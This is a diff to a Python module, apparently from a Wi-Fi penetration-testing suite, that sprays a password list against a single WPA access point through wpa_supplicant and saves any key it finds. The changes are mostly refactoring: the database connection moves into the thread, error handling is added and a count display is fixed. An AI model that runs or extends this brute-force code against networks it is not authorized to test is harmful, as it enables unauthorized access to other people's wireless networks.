@@ -2,30 +2,20 @@
 # Description: Performs a Spray Brute-force attack against the Wi-Fi Protected Access (WPA) protocol.
 # The WPAbrute module is tailored to spray a list of passwords against a single access point/SSID.
 # Author: Nick Sanzotta/@Beamr
-# Version: v 1.09252017
+# Version: v 1.09282017
 try:
 	import os, sys, threading, datetime, time
 	from wpa_supplicant.core import WpaSupplicantDriver
 	from twisted.internet.selectreactor import SelectReactor
 	from twisted.internet import task
 	from theme import *
+	from dbcommands import DB
 except Exception as e:
 	print('\n [!] WPABRUTE - Error: ' % (e))
 	sys.exit(1)
-	
-try:
-	from dbcommands import DB
-	import sqlite3
-	conn = sqlite3.connect('data/WiFiSuite.db', check_same_thread=False) # Thread Support
-	conn.text_factory = str # Interpret 8-bit bytestrings 
-	conn.isolation_level = None # Autocommit Mode
-	db = DB(conn)
-except Exception as e:
-	print(red('!')+'Could not connect to database: %s' % (e))
-	sys.exit(1)
 
 class wpaBrute(threading.Thread):
-	def __init__(self, ssid, password, passwordList, supplicantInt, interface):
+	def __init__(self,db_path, ssid, password, passwordList, supplicantInt, interface):
 			threading.Thread.__init__(self)
 			self.setDaemon(1) # daemon
 			self.ssid = ssid
@@ -35,8 +25,10 @@ class wpaBrute(threading.Thread):
 			self.interface = interface
 			self.log_timestamp = '{:%Y-%m-%d_%H:%M:%S}'.format(datetime.datetime.now())
 			self.wpakey_log = 'data/wpakeys/%s_%s.wpakey' % (self.ssid, self.log_timestamp)
+			self.db_path = db_path
 
 	def run(self):
+		self.database_connect() # Connect to database
 		self.datafolders_check()
 		# Time Stamp for file creation
 		timestr = time.strftime("%Y%m%d-%H%M") # NOT SURE I NEED THIS ANY LONGER
@@ -60,7 +52,6 @@ class wpaBrute(threading.Thread):
 				else:
 					# Time Stamp for each user
 					curr_time2 = time.time()
-					#DEBUG PRINT
 					network_cfg = {
 							"disabled": 0,
 							"ssid": self.ssid, 
@@ -76,7 +67,6 @@ class wpaBrute(threading.Thread):
 					self.interface.add_network(network_cfg)
 					# Attempt association with a configured network # Connect to Network Profile 0
 					self.interface.select_network(self.supplicantInt+'/Networks/0')	
-					# DEBUG: Print Current WPA CONF
 					# print(interface.get_current_network())	
 
 				while True:
@@ -90,7 +80,11 @@ class wpaBrute(threading.Thread):
 						print(' Attempts           :  [%s/%s]\n' % (password_counter, password_list_length))
 						pskSuccess = password
 						successList.append(pskSuccess)
-						db.wpabrute_commit(self.ssid, password)
+						try:
+							self.db.wpabrute_commit(self.ssid, password)
+						except Exception as e:
+							print(red('!')+'WARNING - (WPABRUTE) Could not save to database: %s' % (e))
+							pass
 						# Remove from associated network, which results in state: 'inactive'
 						self.interface.remove_network(self.supplicantInt+'/Networks/0')
 						# Sets Kill Switch to true
@@ -123,7 +117,7 @@ class wpaBrute(threading.Thread):
 			try:
 				print(normal('*')+'Completed in: %.1fs' % (time.time() - curr_time1))
 				print(normal('*')+'SSID Brute-forced: %s' % (self.ssid))
-				print(normal('*')+'Number of Password(s) Tested: [%s]' % (password_list_length))
+				print(normal('*')+'Number of Password(s) Tested: [%s/%s]' % (password_counter-1, password_list_length))
 
 				if len(successList):
 					print('\n'+normal('*')+'WPA Key Log: %s' % (self.wpakey_log))
@@ -139,7 +133,14 @@ class wpaBrute(threading.Thread):
 			self.password.task_done()
 	
 	def datafolders_check(self):
-		'''Creates wpakeys folder(s) if missing'''
+		# Creates wpakeys folder(s) if missing
 		wpakeys_directory = 'data/wpakeys'
 		if not os.path.exists(wpakeys_directory):
 			os.makedirs(wpakeys_directory)
+
+	def database_connect(self):
+		try:
+			self.db = DB(self.db_path)
+		except Exception as e:
+			print(red('!')+'WARNING - (WPABRUTE) Could not connect to database: %s' % (e))
+			pass
